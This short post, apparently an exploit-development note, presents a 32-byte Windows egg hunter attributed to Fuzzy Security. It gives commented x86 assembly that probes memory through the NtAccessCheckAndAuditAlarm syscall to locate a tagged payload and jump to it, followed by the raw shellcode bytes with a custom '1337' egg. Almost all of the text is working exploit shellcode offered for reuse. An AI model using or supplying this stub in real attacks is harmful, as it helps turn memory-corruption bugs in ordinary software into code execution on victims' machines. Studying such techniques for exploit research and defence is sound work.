# Egg Hunter from Fuzzy Security

This is an **Egg hunter** used for Windows Exploit development that I got from Fuzzy Security, it is only 32-bytes long and pretty stable across multiple Windows platforms.  

Here is the assembly code of the Egg Hunter:  

	loop_inc_page:
		or    dx, 0x0fff                    // Add PAGE_SIZE-1 to edx
	loop_inc_one:
		inc   edx                           // Increment our pointer by one
	loop_check:
		push  edx                           // Save edx
		push  0x2                           // Push NtAccessCheckAndAuditAlarm
		pop   eax                           // Pop into eax
		int   0x2e                          // Perform the syscall
		cmp   al, 0x05                      // Did we get 0xc0000005 (ACCESS_VIOLATION) ?
		pop   edx                           // Restore edx
	loop_check_8_valid: 
		je    loop_inc_page                 // Yes, invalid ptr, go to the next page
	
	is_egg:
		mov   eax, 0x50905090               // Throw our egg in eax
		mov   edi, edx                      // Set edi to the pointer we validated
		scasd                               // Compare the dword in edi to eax
		jnz   loop_inc_one                  // No match? Increment the pointer by one
		scasd                               // Compare the dword in edi to eax again (which is now edx + 4)
		jnz   loop_inc_one                  // No match? Increment the pointer by one
	
	matched:
		jmp   edi                           // Found the egg.  Jump 8 bytes past it into our code.


And here are the raw bits of this Egg Hunter, I used the flag **1337** marked in bold below:  

	"\x66\x81\xCA\xFF"
	"\x0F\x42\x52\x6A"
	"\x02\x58\xCD\x2E"
	"\x3C\x05\x5A\x74"
	"\xEF\xB8**\x31\x33**" #13 				
	"**\x33\x37**\x8B\xFA" #37
	"\xAF\x75\xEA\xAF"
	"\x75\xE7\xFF\xE7"


